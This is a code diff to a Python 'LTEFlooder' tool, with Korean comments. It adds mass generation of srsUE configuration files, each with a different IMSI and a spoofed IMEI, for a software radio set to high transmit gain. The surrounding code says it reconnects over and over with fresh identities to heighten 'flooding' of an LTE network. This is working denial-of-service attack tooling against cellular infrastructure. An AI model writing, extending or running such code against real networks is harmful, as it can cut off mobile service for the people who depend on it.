@@ -262,6 +262,87 @@ nas_filename = /tmp/srsue_{unique_id}_nas.pcap
             f.write(config_content)
         return config_path
     
+    def generate_configs_batch(self, count: int = 500, output_dir: str = "ue_configs"):
+        """대량의 config 파일을 미리 생성"""
+        logger.info(f"{count}개의 config 파일을 {output_dir} 폴더에 생성 중...")
+        config_files = []
+        
+        for i in range(1, count + 1):
+            # output_dir에 직접 생성
+            config_path = self._create_ue_config_in_dir(i, output_dir)
+            config_files.append(config_path)
+            
+            if i % 50 == 0:
+                logger.info(f"진행 중... {i}/{count} 생성 완료")
+        
+        logger.info(f"✓ {count}개의 config 파일 생성 완료: {output_dir}/")
+        return config_files
+    
+    def _create_ue_config_in_dir(self, unique_id: int, output_dir: str) -> str:
+        """지정된 디렉토리에 config 파일 생성"""
+        # EARFCN 설정 (주파수)
+        if self.earfcn is not None:
+            earfcn_value = self.earfcn
+            earfcn_line = f"dl_earfcn = {earfcn_value}"
+        elif (self.mcc is not None or self.mnc is not None):
+            earfcn_line = "# dl_earfcn =  # 자동 스캔 (MCC/MNC 지정됨)"
+            earfcn_value = "자동 스캔"
+        else:
+            earfcn_value = 3400
+            earfcn_line = f"dl_earfcn = {earfcn_value}"
+        
+        # MCC/MNC 설정
+        mcc_mnc_section = ""
+        if self.mcc is not None:
+            mcc_mnc_section += f"mcc = {self.mcc}\n"
+        if self.mnc is not None:
+            mcc_mnc_section += f"mnc = {self.mnc}\n"
+        
+        # IMSI 생성
+        if self.mcc is not None and self.mnc is not None:
+            mnc_digits = 3 if self.mnc >= 100 else 2
+            mcc_mnc_len = 3 + mnc_digits
+            msin_len = 15 - mcc_mnc_len
+            imsi = f"{self.mcc:03d}{self.mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
+        elif self.mcc is not None:
+            imsi = f"{self.mcc:03d}01{unique_id:010d}"
+        elif self.mnc is not None:
+            mnc_digits = 3 if self.mnc >= 100 else 2
+            mcc_mnc_len = 3 + mnc_digits
+            msin_len = 15 - mcc_mnc_len
+            imsi = f"001{self.mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
+        else:
+            imsi = f"00101{unique_id:010d}"
+        
+        config_content = f"""[rf]
+device_name = uhd
+device_args = {self.usrp_args}
+tx_gain = 90
+rx_gain = 60
+nof_antennas = 1
+
+[rat.eutra]
+{earfcn_line}
+{mcc_mnc_section}nof_carriers = 1
+
+[usim]
+mode = soft
+algo = milenage
+opc  = {self.usim_opc}
+k    = {self.usim_k}
+imsi = {imsi}
+imei = 353490069873{unique_id:06d}
+
+[pcap]
+enable = true
+mac_filename = /tmp/srsue_{unique_id}_mac.pcap
+nas_filename = /tmp/srsue_{unique_id}_nas.pcap
+"""
+        config_path = os.path.join(output_dir, f"srsue_{unique_id}.conf")
+        with open(config_path, 'w') as f:
+            f.write(config_content)
+        return config_path
+    
     def run_flooding(self):
         """srsUE 실행 (연결 성공 시 즉시 종료하여 빠른 재연결, 매번 다른 IMSI/IMEI)"""
         log_file = "srsue_flooding.log"
@@ -728,17 +809,37 @@ def main():
         default=1,
         help="동시에 실행할 프로세스 수 (기본값: 1). 여러 프로세스를 동시에 실행하여 flooding 효과를 높입니다."
     )
+    parser.add_argument(
+        "--generate-configs",
+        type=int,
+        default=None,
+        metavar="N",
+        help="N개의 config 파일을 미리 생성하고 종료합니다 (예: --generate-configs 500)"
+    )
+    parser.add_argument(
+        "--config-dir",
+        type=str,
+        default="ue_configs",
+        help="생성된 config 파일을 저장할 디렉토리 (기본값: ue_configs)"
+    )
     
     args = parser.parse_args()
     
     flooder = LTEFlooder(
         usrp_args=args.usrp_args,
         interval=args.interval,
+        srsue_config="srsue.conf",
         mcc=args.mcc,
         mnc=args.mnc,
         earfcn=args.earfcn,
         instances=args.instances
     )
+    
+    # config 파일 생성 모드
+    if args.generate_configs:
+        flooder.generate_configs_batch(args.generate_configs, args.config_dir)
+        logger.info(f"생성 완료! {args.generate_configs}개의 config 파일이 {args.config_dir}에 생성되었습니다.")
+        return
     
     # 시그널 핸들러 설정
     def signal_handler(sig, frame):
